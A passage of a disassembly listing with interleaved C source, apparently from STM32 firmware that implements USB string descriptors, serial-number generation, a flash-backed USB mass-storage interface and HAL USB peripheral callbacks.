 800c588:	b580      	push	{r7, lr}
 800c58a:	b082      	sub	sp, #8
 800c58c:	af00      	add	r7, sp, #0
 800c58e:	4603      	mov	r3, r0
 800c590:	6039      	str	r1, [r7, #0]
 800c592:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c594:	79fb      	ldrb	r3, [r7, #7]
 800c596:	2b00      	cmp	r3, #0
 800c598:	d105      	bne.n	800c5a6 <USBD_FS_InterfaceStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c59a:	683a      	ldr	r2, [r7, #0]
 800c59c:	4907      	ldr	r1, [pc, #28]	; (800c5bc <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c59e:	4808      	ldr	r0, [pc, #32]	; (800c5c0 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c5a0:	f7ff fe00 	bl	800c1a4 <USBD_GetString>
 800c5a4:	e004      	b.n	800c5b0 <USBD_FS_InterfaceStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c5a6:	683a      	ldr	r2, [r7, #0]
 800c5a8:	4904      	ldr	r1, [pc, #16]	; (800c5bc <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c5aa:	4805      	ldr	r0, [pc, #20]	; (800c5c0 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c5ac:	f7ff fdfa 	bl	800c1a4 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c5b0:	4b02      	ldr	r3, [pc, #8]	; (800c5bc <USBD_FS_InterfaceStrDescriptor+0x34>)
}
 800c5b2:	4618      	mov	r0, r3
 800c5b4:	3708      	adds	r7, #8
 800c5b6:	46bd      	mov	sp, r7
 800c5b8:	bd80      	pop	{r7, pc}
 800c5ba:	bf00      	nop
 800c5bc:	2000097c 	.word	0x2000097c
 800c5c0:	0800d188 	.word	0x0800d188

0800c5c4 <USBD_FS_USR_BOSDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_USR_BOSDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c5c4:	b480      	push	{r7}
 800c5c6:	b083      	sub	sp, #12
 800c5c8:	af00      	add	r7, sp, #0
 800c5ca:	4603      	mov	r3, r0
 800c5cc:	6039      	str	r1, [r7, #0]
 800c5ce:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_BOSDesc);
 800c5d0:	683b      	ldr	r3, [r7, #0]
 800c5d2:	220c      	movs	r2, #12
 800c5d4:	801a      	strh	r2, [r3, #0]
  return (uint8_t*)USBD_FS_BOSDesc;
 800c5d6:	4b03      	ldr	r3, [pc, #12]	; (800c5e4 <USBD_FS_USR_BOSDescriptor+0x20>)
}
 800c5d8:	4618      	mov	r0, r3
 800c5da:	370c      	adds	r7, #12
 800c5dc:	46bd      	mov	sp, r7
 800c5de:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c5e2:	4770      	bx	lr
 800c5e4:	200001f4 	.word	0x200001f4

0800c5e8 <Get_SerialNum>:
  * @brief  Create the serial number string descriptor
  * @param  None
  * @retval None
  */
static void Get_SerialNum(void)
{
 800c5e8:	b580      	push	{r7, lr}
 800c5ea:	b084      	sub	sp, #16
 800c5ec:	af00      	add	r7, sp, #0
  uint32_t deviceserial0;
  uint32_t deviceserial1;
  uint32_t deviceserial2;

  deviceserial0 = *(uint32_t *) DEVICE_ID1;
 800c5ee:	4b0f      	ldr	r3, [pc, #60]	; (800c62c <Get_SerialNum+0x44>)
 800c5f0:	681b      	ldr	r3, [r3, #0]
 800c5f2:	60fb      	str	r3, [r7, #12]
  deviceserial1 = *(uint32_t *) DEVICE_ID2;
 800c5f4:	4b0e      	ldr	r3, [pc, #56]	; (800c630 <Get_SerialNum+0x48>)
 800c5f6:	681b      	ldr	r3, [r3, #0]
 800c5f8:	60bb      	str	r3, [r7, #8]
  deviceserial2 = *(uint32_t *) DEVICE_ID3;
 800c5fa:	4b0e      	ldr	r3, [pc, #56]	; (800c634 <Get_SerialNum+0x4c>)
 800c5fc:	681b      	ldr	r3, [r3, #0]
 800c5fe:	607b      	str	r3, [r7, #4]

  deviceserial0 += deviceserial2;
 800c600:	68fa      	ldr	r2, [r7, #12]
 800c602:	687b      	ldr	r3, [r7, #4]
 800c604:	4413      	add	r3, r2
 800c606:	60fb      	str	r3, [r7, #12]

  if (deviceserial0 != 0)
 800c608:	68fb      	ldr	r3, [r7, #12]
 800c60a:	2b00      	cmp	r3, #0
 800c60c:	d009      	beq.n	800c622 <Get_SerialNum+0x3a>
  {
    IntToUnicode(deviceserial0, &USBD_StringSerial[2], 8);
 800c60e:	2208      	movs	r2, #8
 800c610:	4909      	ldr	r1, [pc, #36]	; (800c638 <Get_SerialNum+0x50>)
 800c612:	68f8      	ldr	r0, [r7, #12]
 800c614:	f000 f814 	bl	800c640 <IntToUnicode>
    IntToUnicode(deviceserial1, &USBD_StringSerial[18], 4);
 800c618:	2204      	movs	r2, #4
 800c61a:	4908      	ldr	r1, [pc, #32]	; (800c63c <Get_SerialNum+0x54>)
 800c61c:	68b8      	ldr	r0, [r7, #8]
 800c61e:	f000 f80f 	bl	800c640 <IntToUnicode>
  }
}
 800c622:	bf00      	nop
 800c624:	3710      	adds	r7, #16
 800c626:	46bd      	mov	sp, r7
 800c628:	bd80      	pop	{r7, pc}
 800c62a:	bf00      	nop
 800c62c:	1fff7590 	.word	0x1fff7590
 800c630:	1fff7594 	.word	0x1fff7594
 800c634:	1fff7598 	.word	0x1fff7598
 800c638:	20000206 	.word	0x20000206
 800c63c:	20000216 	.word	0x20000216

0800c640 <IntToUnicode>:
  * @param  pbuf: pointer to the buffer
  * @param  len: buffer length
  * @retval None
  */
static void IntToUnicode(uint32_t value, uint8_t * pbuf, uint8_t len)
{
 800c640:	b480      	push	{r7}
 800c642:	b087      	sub	sp, #28
 800c644:	af00      	add	r7, sp, #0
 800c646:	60f8      	str	r0, [r7, #12]
 800c648:	60b9      	str	r1, [r7, #8]
 800c64a:	4613      	mov	r3, r2
 800c64c:	71fb      	strb	r3, [r7, #7]
  uint8_t idx = 0;
 800c64e:	2300      	movs	r3, #0
 800c650:	75fb      	strb	r3, [r7, #23]

  for (idx = 0; idx < len; idx++)
 800c652:	2300      	movs	r3, #0
 800c654:	75fb      	strb	r3, [r7, #23]
 800c656:	e027      	b.n	800c6a8 <IntToUnicode+0x68>
  {
    if (((value >> 28)) < 0xA)
 800c658:	68fb      	ldr	r3, [r7, #12]
 800c65a:	0f1b      	lsrs	r3, r3, #28
 800c65c:	2b09      	cmp	r3, #9
 800c65e:	d80b      	bhi.n	800c678 <IntToUnicode+0x38>
    {
      pbuf[2 * idx] = (value >> 28) + '0';
 800c660:	68fb      	ldr	r3, [r7, #12]
 800c662:	0f1b      	lsrs	r3, r3, #28
 800c664:	b2da      	uxtb	r2, r3
 800c666:	7dfb      	ldrb	r3, [r7, #23]
 800c668:	005b      	lsls	r3, r3, #1
 800c66a:	4619      	mov	r1, r3
 800c66c:	68bb      	ldr	r3, [r7, #8]
 800c66e:	440b      	add	r3, r1
 800c670:	3230      	adds	r2, #48	; 0x30
 800c672:	b2d2      	uxtb	r2, r2
 800c674:	701a      	strb	r2, [r3, #0]
 800c676:	e00a      	b.n	800c68e <IntToUnicode+0x4e>
    }
    else
    {
      pbuf[2 * idx] = (value >> 28) + 'A' - 10;
 800c678:	68fb      	ldr	r3, [r7, #12]
 800c67a:	0f1b      	lsrs	r3, r3, #28
 800c67c:	b2da      	uxtb	r2, r3
 800c67e:	7dfb      	ldrb	r3, [r7, #23]
 800c680:	005b      	lsls	r3, r3, #1
 800c682:	4619      	mov	r1, r3
 800c684:	68bb      	ldr	r3, [r7, #8]
 800c686:	440b      	add	r3, r1
 800c688:	3237      	adds	r2, #55	; 0x37
 800c68a:	b2d2      	uxtb	r2, r2
 800c68c:	701a      	strb	r2, [r3, #0]
    }

    value = value << 4;
 800c68e:	68fb      	ldr	r3, [r7, #12]
 800c690:	011b      	lsls	r3, r3, #4
 800c692:	60fb      	str	r3, [r7, #12]

    pbuf[2 * idx + 1] = 0;
 800c694:	7dfb      	ldrb	r3, [r7, #23]
 800c696:	005b      	lsls	r3, r3, #1
 800c698:	3301      	adds	r3, #1
 800c69a:	68ba      	ldr	r2, [r7, #8]
 800c69c:	4413      	add	r3, r2
 800c69e:	2200      	movs	r2, #0
 800c6a0:	701a      	strb	r2, [r3, #0]
  for (idx = 0; idx < len; idx++)
 800c6a2:	7dfb      	ldrb	r3, [r7, #23]
 800c6a4:	3301      	adds	r3, #1
 800c6a6:	75fb      	strb	r3, [r7, #23]
 800c6a8:	7dfa      	ldrb	r2, [r7, #23]
 800c6aa:	79fb      	ldrb	r3, [r7, #7]
 800c6ac:	429a      	cmp	r2, r3
 800c6ae:	d3d3      	bcc.n	800c658 <IntToUnicode+0x18>
  }
}
 800c6b0:	bf00      	nop
 800c6b2:	bf00      	nop
 800c6b4:	371c      	adds	r7, #28
 800c6b6:	46bd      	mov	sp, r7
 800c6b8:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6bc:	4770      	bx	lr

0800c6be <STORAGE_Init_FS>:
  * @brief  Initializes over USB FS IP
  * @param  lun:
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
 800c6be:	b480      	push	{r7}
 800c6c0:	b083      	sub	sp, #12
 800c6c2:	af00      	add	r7, sp, #0
 800c6c4:	4603      	mov	r3, r0
 800c6c6:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 2 */
  return (USBD_OK);
 800c6c8:	2300      	movs	r3, #0
  /* USER CODE END 2 */
}
 800c6ca:	4618      	mov	r0, r3
 800c6cc:	370c      	adds	r7, #12
 800c6ce:	46bd      	mov	sp, r7
 800c6d0:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6d4:	4770      	bx	lr

0800c6d6 <STORAGE_GetCapacity_FS>:
  * @param  block_num: .
  * @param  block_size: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_GetCapacity_FS(uint8_t lun, uint32_t *block_num, uint16_t *block_size)
{
 800c6d6:	b480      	push	{r7}
 800c6d8:	b085      	sub	sp, #20
 800c6da:	af00      	add	r7, sp, #0
 800c6dc:	4603      	mov	r3, r0
 800c6de:	60b9      	str	r1, [r7, #8]
 800c6e0:	607a      	str	r2, [r7, #4]
 800c6e2:	73fb      	strb	r3, [r7, #15]
  /* USER CODE BEGIN 3 */
	*block_num  = FLASH_PAGE_NBR;
 800c6e4:	68bb      	ldr	r3, [r7, #8]
 800c6e6:	2240      	movs	r2, #64	; 0x40
 800c6e8:	601a      	str	r2, [r3, #0]
	*block_size = FLASH_PAGE_SIZE;
 800c6ea:	687b      	ldr	r3, [r7, #4]
 800c6ec:	f44f 6200 	mov.w	r2, #2048	; 0x800
 800c6f0:	801a      	strh	r2, [r3, #0]
  return (USBD_OK);
 800c6f2:	2300      	movs	r3, #0
  /* USER CODE END 3 */
}
 800c6f4:	4618      	mov	r0, r3
 800c6f6:	3714      	adds	r7, #20
 800c6f8:	46bd      	mov	sp, r7
 800c6fa:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6fe:	4770      	bx	lr

0800c700 <STORAGE_IsReady_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsReady_FS(uint8_t lun)
{
 800c700:	b480      	push	{r7}
 800c702:	b083      	sub	sp, #12
 800c704:	af00      	add	r7, sp, #0
 800c706:	4603      	mov	r3, r0
 800c708:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c70a:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c70c:	4618      	mov	r0, r3
 800c70e:	370c      	adds	r7, #12
 800c710:	46bd      	mov	sp, r7
 800c712:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c716:	4770      	bx	lr

0800c718 <STORAGE_IsWriteProtected_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsWriteProtected_FS(uint8_t lun)
{
 800c718:	b480      	push	{r7}
 800c71a:	b083      	sub	sp, #12
 800c71c:	af00      	add	r7, sp, #0
 800c71e:	4603      	mov	r3, r0
 800c720:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c722:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c724:	4618      	mov	r0, r3
 800c726:	370c      	adds	r7, #12
 800c728:	46bd      	mov	sp, r7
 800c72a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c72e:	4770      	bx	lr

0800c730 <STORAGE_Read_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c730:	b580      	push	{r7, lr}
 800c732:	b084      	sub	sp, #16
 800c734:	af00      	add	r7, sp, #0
 800c736:	60b9      	str	r1, [r7, #8]
 800c738:	607a      	str	r2, [r7, #4]
 800c73a:	461a      	mov	r2, r3
 800c73c:	4603      	mov	r3, r0
 800c73e:	73fb      	strb	r3, [r7, #15]
 800c740:	4613      	mov	r3, r2
 800c742:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 6 */
	if(lun == 0){
 800c744:	7bfb      	ldrb	r3, [r7, #15]
 800c746:	2b00      	cmp	r3, #0
 800c748:	d10d      	bne.n	800c766 <STORAGE_Read_FS+0x36>
		memcpy(buf, (uint8_t*)(FLASH_START_ADDR + blk_addr * FLASH_PAGE_SIZE), blk_len * FLASH_PAGE_SIZE);
 800c74a:	687b      	ldr	r3, [r7, #4]
 800c74c:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c750:	3340      	adds	r3, #64	; 0x40
 800c752:	02db      	lsls	r3, r3, #11
 800c754:	4619      	mov	r1, r3
 800c756:	89bb      	ldrh	r3, [r7, #12]
 800c758:	02db      	lsls	r3, r3, #11
 800c75a:	461a      	mov	r2, r3
 800c75c:	68b8      	ldr	r0, [r7, #8]
 800c75e:	f000 fc65 	bl	800d02c <memcpy>
		return (USBD_OK);
 800c762:	2300      	movs	r3, #0
 800c764:	e000      	b.n	800c768 <STORAGE_Read_FS+0x38>
	}
  return (USBD_FAIL);
 800c766:	2303      	movs	r3, #3
  /* USER CODE END 6 */
}
 800c768:	4618      	mov	r0, r3
 800c76a:	3710      	adds	r7, #16
 800c76c:	46bd      	mov	sp, r7
 800c76e:	bd80      	pop	{r7, pc}

0800c770 <STORAGE_Write_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c770:	b580      	push	{r7, lr}
 800c772:	b08a      	sub	sp, #40	; 0x28
 800c774:	af00      	add	r7, sp, #0
 800c776:	60b9      	str	r1, [r7, #8]
 800c778:	607a      	str	r2, [r7, #4]
 800c77a:	461a      	mov	r2, r3
 800c77c:	4603      	mov	r3, r0
 800c77e:	73fb      	strb	r3, [r7, #15]
 800c780:	4613      	mov	r3, r2
 800c782:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 7 */
	if(lun == 0){
 800c784:	7bfb      	ldrb	r3, [r7, #15]
 800c786:	2b00      	cmp	r3, #0
 800c788:	d136      	bne.n	800c7f8 <STORAGE_Write_FS+0x88>
		uint16_t i;
		HAL_FLASH_Unlock();
 800c78a:	f7f4 febb 	bl	8001504 <HAL_FLASH_Unlock>
		FLASH_EraseInitTypeDef f;
		f.TypeErase = FLASH_TYPEERASE_PAGES;
 800c78e:	2300      	movs	r3, #0
 800c790:	617b      	str	r3, [r7, #20]
		f.Banks = FLASH_BANK_BOTH;
 800c792:	2301      	movs	r3, #1
 800c794:	61bb      	str	r3, [r7, #24]
		f.Page = (FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE)/FLASH_PAGE_SIZE;
 800c796:	687b      	ldr	r3, [r7, #4]
 800c798:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c79c:	3340      	adds	r3, #64	; 0x40
 800c79e:	f3c3 0314 	ubfx	r3, r3, #0, #21
 800c7a2:	61fb      	str	r3, [r7, #28]
		f.NbPages = blk_len;
 800c7a4:	89bb      	ldrh	r3, [r7, #12]
 800c7a6:	623b      	str	r3, [r7, #32]
		uint32_t PageError = 0;
 800c7a8:	2300      	movs	r3, #0
 800c7aa:	613b      	str	r3, [r7, #16]
		HAL_FLASHEx_Erase(&f, &PageError);
 800c7ac:	f107 0210 	add.w	r2, r7, #16
 800c7b0:	f107 0314 	add.w	r3, r7, #20
 800c7b4:	4611      	mov	r1, r2
 800c7b6:	4618      	mov	r0, r3
 800c7b8:	f7f4 ff8a 	bl	80016d0 <HAL_FLASHEx_Erase>

		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c7bc:	2300      	movs	r3, #0
 800c7be:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c7c0:	e011      	b.n	800c7e6 <STORAGE_Write_FS+0x76>
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
					FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE + i,
 800c7c2:	687b      	ldr	r3, [r7, #4]
 800c7c4:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c7c8:	3340      	adds	r3, #64	; 0x40
 800c7ca:	02da      	lsls	r2, r3, #11
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c7cc:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7ce:	18d1      	adds	r1, r2, r3
					*(uint64_t *)(&buf[i]));
 800c7d0:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7d2:	68ba      	ldr	r2, [r7, #8]
 800c7d4:	4413      	add	r3, r2
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c7d6:	e9d3 2300 	ldrd	r2, r3, [r3]
 800c7da:	2000      	movs	r0, #0
 800c7dc:	f7f4 fe26 	bl	800142c <HAL_FLASH_Program>
		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c7e0:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7e2:	3308      	adds	r3, #8
 800c7e4:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c7e6:	8cfa      	ldrh	r2, [r7, #38]	; 0x26
 800c7e8:	89bb      	ldrh	r3, [r7, #12]
 800c7ea:	02db      	lsls	r3, r3, #11
 800c7ec:	429a      	cmp	r2, r3
 800c7ee:	d3e8      	bcc.n	800c7c2 <STORAGE_Write_FS+0x52>

		HAL_FLASH_Lock();
 800c7f0:	f7f4 feaa 	bl	8001548 <HAL_FLASH_Lock>
		return USBD_OK;
 800c7f4:	2300      	movs	r3, #0
 800c7f6:	e000      	b.n	800c7fa <STORAGE_Write_FS+0x8a>
	}
  return (USBD_FAIL);
 800c7f8:	2303      	movs	r3, #3
  /* USER CODE END 7 */
}
 800c7fa:	4618      	mov	r0, r3
 800c7fc:	3728      	adds	r7, #40	; 0x28
 800c7fe:	46bd      	mov	sp, r7
 800c800:	bd80      	pop	{r7, pc}

0800c802 <STORAGE_GetMaxLun_FS>:
  * @brief  .
  * @param  None
  * @retval .
  */
int8_t STORAGE_GetMaxLun_FS(void)
{
 800c802:	b480      	push	{r7}
 800c804:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 8 */
  return (STORAGE_LUN_NBR - 1);
 800c806:	2300      	movs	r3, #0
  /* USER CODE END 8 */
}
 800c808:	4618      	mov	r0, r3
 800c80a:	46bd      	mov	sp, r7
 800c80c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c810:	4770      	bx	lr
	...

0800c814 <HAL_PCD_MspInit>:
                       LL Driver Callbacks (PCD -> USB Device Library)
*******************************************************************************/
/* MSP Init */

void HAL_PCD_MspInit(PCD_HandleTypeDef* pcdHandle)
{
 800c814:	b580      	push	{r7, lr}
 800c816:	b098      	sub	sp, #96	; 0x60
 800c818:	af00      	add	r7, sp, #0
 800c81a:	6078      	str	r0, [r7, #4]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800c81c:	f107 030c 	add.w	r3, r7, #12
 800c820:	2254      	movs	r2, #84	; 0x54
 800c822:	2100      	movs	r1, #0
 800c824:	4618      	mov	r0, r3
 800c826:	f000 fbd5 	bl	800cfd4 <memset>
  if(pcdHandle->Instance==USB)
 800c82a:	687b      	ldr	r3, [r7, #4]
 800c82c:	681b      	ldr	r3, [r3, #0]
 800c82e:	4a1d      	ldr	r2, [pc, #116]	; (800c8a4 <HAL_PCD_MspInit+0x90>)
 800c830:	4293      	cmp	r3, r2
 800c832:	d132      	bne.n	800c89a <HAL_PCD_MspInit+0x86>

  /* USER CODE END USB_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
 800c834:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 800c838:	60fb      	str	r3, [r7, #12]
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLLSAI1;
 800c83a:	f04f 6380 	mov.w	r3, #67108864	; 0x4000000
 800c83e:	64fb      	str	r3, [r7, #76]	; 0x4c
    PeriphClkInit.PLLSAI1.PLLSAI1Source = RCC_PLLSOURCE_MSI;
 800c840:	2301      	movs	r3, #1
 800c842:	613b      	str	r3, [r7, #16]
    PeriphClkInit.PLLSAI1.PLLSAI1M = 1;
 800c844:	2301      	movs	r3, #1
 800c846:	617b      	str	r3, [r7, #20]
    PeriphClkInit.PLLSAI1.PLLSAI1N = 24;
 800c848:	2318      	movs	r3, #24
 800c84a:	61bb      	str	r3, [r7, #24]
    PeriphClkInit.PLLSAI1.PLLSAI1P = RCC_PLLP_DIV7;
 800c84c:	2307      	movs	r3, #7
 800c84e:	61fb      	str	r3, [r7, #28]
    PeriphClkInit.PLLSAI1.PLLSAI1Q = RCC_PLLQ_DIV2;
 800c850:	2302      	movs	r3, #2
 800c852:	623b      	str	r3, [r7, #32]
    PeriphClkInit.PLLSAI1.PLLSAI1R = RCC_PLLR_DIV2;
 800c854:	2302      	movs	r3, #2
 800c856:	627b      	str	r3, [r7, #36]	; 0x24
    PeriphClkInit.PLLSAI1.PLLSAI1ClockOut = RCC_PLLSAI1_48M2CLK;
 800c858:	f44f 1380 	mov.w	r3, #1048576	; 0x100000
 800c85c:	62bb      	str	r3, [r7, #40]	; 0x28
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 800c85e:	f107 030c 	add.w	r3, r7, #12
 800c862:	4618      	mov	r0, r3
 800c864:	f7f7 fe5c 	bl	8004520 <HAL_RCCEx_PeriphCLKConfig>
 800c868:	4603      	mov	r3, r0
 800c86a:	2b00      	cmp	r3, #0
 800c86c:	d001      	beq.n	800c872 <HAL_PCD_MspInit+0x5e>
    {
      Error_Handler();
 800c86e:	f7f4 fa03 	bl	8000c78 <Error_Handler>
    }

    /* Peripheral clock enable */
    __HAL_RCC_USB_CLK_ENABLE();
 800c872:	4b0d      	ldr	r3, [pc, #52]	; (800c8a8 <HAL_PCD_MspInit+0x94>)
 800c874:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c876:	4a0c      	ldr	r2, [pc, #48]	; (800c8a8 <HAL_PCD_MspInit+0x94>)
 800c878:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 800c87c:	6593      	str	r3, [r2, #88]	; 0x58
 800c87e:	4b0a      	ldr	r3, [pc, #40]	; (800c8a8 <HAL_PCD_MspInit+0x94>)
 800c880:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c882:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800c886:	60bb      	str	r3, [r7, #8]
 800c888:	68bb      	ldr	r3, [r7, #8]

    /* Peripheral interrupt init */
    HAL_NVIC_SetPriority(USB_IRQn, 0, 0);
 800c88a:	2200      	movs	r2, #0
 800c88c:	2100      	movs	r1, #0
 800c88e:	2043      	movs	r0, #67	; 0x43
 800c890:	f7f4 fd95 	bl	80013be <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USB_IRQn);
 800c894:	2043      	movs	r0, #67	; 0x43
 800c896:	f7f4 fdae 	bl	80013f6 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USB_MspInit 1 */

  /* USER CODE END USB_MspInit 1 */
  }
}
 800c89a:	bf00      	nop
 800c89c:	3760      	adds	r7, #96	; 0x60
 800c89e:	46bd      	mov	sp, r7
 800c8a0:	bd80      	pop	{r7, pc}
 800c8a2:	bf00      	nop
 800c8a4:	40006800 	.word	0x40006800
 800c8a8:	40021000 	.word	0x40021000

0800c8ac <HAL_PCD_SetupStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c8ac:	b580      	push	{r7, lr}
 800c8ae:	b082      	sub	sp, #8
 800c8b0:	af00      	add	r7, sp, #0
 800c8b2:	6078      	str	r0, [r7, #4]
  USBD_LL_SetupStage((USBD_HandleTypeDef*)hpcd->pData, (uint8_t *)hpcd->Setup);
 800c8b4:	687b      	ldr	r3, [r7, #4]
 800c8b6:	f8d3 22f4 	ldr.w	r2, [r3, #756]	; 0x2f4
 800c8ba:	687b      	ldr	r3, [r7, #4]
 800c8bc:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800c8c0:	4619      	mov	r1, r3
 800c8c2:	4610      	mov	r0, r2
 800c8c4:	f7fe fb70 	bl	800afa8 <USBD_LL_SetupStage>
}
 800c8c8:	bf00      	nop
 800c8ca:	3708      	adds	r7, #8
 800c8cc:	46bd      	mov	sp, r7
 800c8ce:	bd80      	pop	{r7, pc}

0800c8d0 <HAL_PCD_DataOutStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c8d0:	b580      	push	{r7, lr}
 800c8d2:	b082      	sub	sp, #8
 800c8d4:	af00      	add	r7, sp, #0
 800c8d6:	6078      	str	r0, [r7, #4]
 800c8d8:	460b      	mov	r3, r1
 800c8da:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataOutStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->OUT_ep[epnum].xfer_buff);
 800c8dc:	687b      	ldr	r3, [r7, #4]
 800c8de:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c8e2:	78fa      	ldrb	r2, [r7, #3]
 800c8e4:	6879      	ldr	r1, [r7, #4]
 800c8e6:	4613      	mov	r3, r2
 800c8e8:	009b      	lsls	r3, r3, #2
 800c8ea:	4413      	add	r3, r2
 800c8ec:	00db      	lsls	r3, r3, #3
 800c8ee:	440b      	add	r3, r1
 800c8f0:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800c8f4:	681a      	ldr	r2, [r3, #0]
 800c8f6:	78fb      	ldrb	r3, [r7, #3]
 800c8f8:	4619      	mov	r1, r3
 800c8fa:	f7fe fbaa 	bl	800b052 <USBD_LL_DataOutStage>
}
 800c8fe:	bf00      	nop
 800c900:	3708      	adds	r7, #8
 800c902:	46bd      	mov	sp, r7
 800c904:	bd80      	pop	{r7, pc}

0800c906 <HAL_PCD_DataInStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c906:	b580      	push	{r7, lr}
 800c908:	b082      	sub	sp, #8
 800c90a:	af00      	add	r7, sp, #0
 800c90c:	6078      	str	r0, [r7, #4]
 800c90e:	460b      	mov	r3, r1
 800c910:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataInStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->IN_ep[epnum].xfer_buff);
 800c912:	687b      	ldr	r3, [r7, #4]
 800c914:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c918:	78fa      	ldrb	r2, [r7, #3]
 800c91a:	6879      	ldr	r1, [r7, #4]
 800c91c:	4613      	mov	r3, r2
 800c91e:	009b      	lsls	r3, r3, #2
 800c920:	4413      	add	r3, r2
 800c922:	00db      	lsls	r3, r3, #3
 800c924:	440b      	add	r3, r1
 800c926:	333c      	adds	r3, #60	; 0x3c
 800c928:	681a      	ldr	r2, [r3, #0]
 800c92a:	78fb      	ldrb	r3, [r7, #3]
 800c92c:	4619      	mov	r1, r3
 800c92e:	f7fe fc43 	bl	800b1b8 <USBD_LL_DataInStage>
}
 800c932:	bf00      	nop
 800c934:	3708      	adds	r7, #8
 800c936:	46bd      	mov	sp, r7
 800c938:	bd80      	pop	{r7, pc}

0800c93a <HAL_PCD_SOFCallback>:
